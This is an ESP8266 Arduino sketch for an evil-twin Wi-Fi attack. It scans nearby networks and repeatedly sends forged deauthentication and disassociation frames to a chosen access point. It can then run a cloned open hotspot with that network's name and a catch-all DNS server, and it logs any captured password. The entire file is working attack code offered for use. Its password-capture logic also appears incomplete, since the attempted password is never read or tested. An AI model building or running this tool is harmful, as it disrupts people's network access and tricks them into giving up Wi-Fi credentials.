#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
#include "user_interface.h"
}

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray()
{
  for (int i = 0; i < 16; i++)
  {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

void setup()
{
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("Evil-Twin", "zxcvbnm123");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void performScan()
{
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0)
  {
    for (int i = 0; i < n && i < 16; ++i)
    {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++)
      {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult()
{
  String html = "";
  if (WiFi.status() != WL_CONNECTED)
  {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{font-family: Arial, sans-serif;}</style></head><body><div style='text-align: center; margin-top: 100px;'><h2>Wrong Password</h2><p>Please try again.</p></div></body></html>");
    Serial.println("Wrong password tried!");
  }
  else
  {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{font-family: Arial, sans-serif;}</style></head><body><div style='text-align: center; margin-top: 100px;'><h2>Good password</h2></div></body></html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("Evil-Twin", "zxcvbnm123");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered!");
    Serial.println(_correct);
  }
}

String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{font-family: Arial, sans-serif;}table{width: 100%;border-collapse: collapse;}th, td{padding: 8px; text-align: left;}th{background-color: #f2f2f2;}button{padding: 8px 12px; border: none; border-radius: 4px; background-color: #4CAF50; color: white; cursor: pointer;}</style></head><body><div style='max-width: 500px; margin: auto;'><form style='display: inline-block;' method='post' action='/?deauth={deauth}'><button{deauth_disabled}>{deauth_button}</button></form><form style='display: inline-block; padding-left: 8px;' method='post' action='/?hotspot={hotspot}'><button{hotspot_disabled}>{hotspot_button}</button></form><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex()
{
  if (webServer.hasArg("ap"))
  {
    for (int i = 0; i < 16; i++)
    {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap"))
      {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth"))
  {
    if (webServer.arg("deauth") == "start")
    {
      deauthing_active = true;
    }
    else if (webServer.arg("deauth") == "stop")
    {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot"))
  {
    if (webServer.arg("hotspot") == "start")
    {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    else if (webServer.arg("hotspot") == "stop")
    {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("Evil-Twin", "zxcvbnm123");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  String _html = _tempHTML;

  for (int i = 0; i < 16; ++i)
  {
    if (_networks[i].ssid == "")
    {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

    if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6))
    {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    }
    else
    {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active)
  {
    _html.replace("{deauth_button}", "Stop Deauthing");
    _html.replace("{deauth_disabled}", "");
  }
  else
  {
    _html.replace("{deauth_button}", "Start Deauthing");
    _html.replace("{deauth_disabled}", " disabled");
  }

  if (hotspot_active)
  {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot_disabled}", "");
  }
  else
  {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot_disabled}", " disabled");
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);
}

void handleAdmin()
{
  String _html = _tempHTML;

  if (webServer.hasArg("ap"))
  {
    for (int i = 0; i < 16; i++)
    {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap"))
      {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth"))
  {
    if (webServer.arg("deauth") == "start")
    {
      deauthing_active = true;
    }
    else if (webServer.arg("deauth") == "stop")
    {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot"))
  {
    if (webServer.arg("hotspot") == "start")
    {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    else if (webServer.arg("hotspot") == "stop")
    {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("Evil-Twin", "zxcvbnm123");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i)
  {
    if (_networks[i].ssid == "")
    {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

    if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6))
    {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    }
    else
    {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active)
  {
    _html.replace("{deauth_button}", "Stop Deauthing");
    _html.replace("{deauth_disabled}", "");
  }
  else
  {
    _html.replace("{deauth_button}", "Start Deauthing");
    _html.replace("{deauth_disabled}", " disabled");
  }

  if (hotspot_active)
  {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot_disabled}", "");
  }
  else
  {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot_disabled}", " disabled");
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);
}

String bytesToStr(const uint8_t *b, uint32_t size)
{
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++)
  {
    if (b[i] < 0x10)
      str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1)
      str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

void loop()
{
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000)
  {
    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000)
  {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000)
  {
    if (WiFi.status() != WL_CONNECTED)
    {
      Serial.println("BAD");
    }
    else
    {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
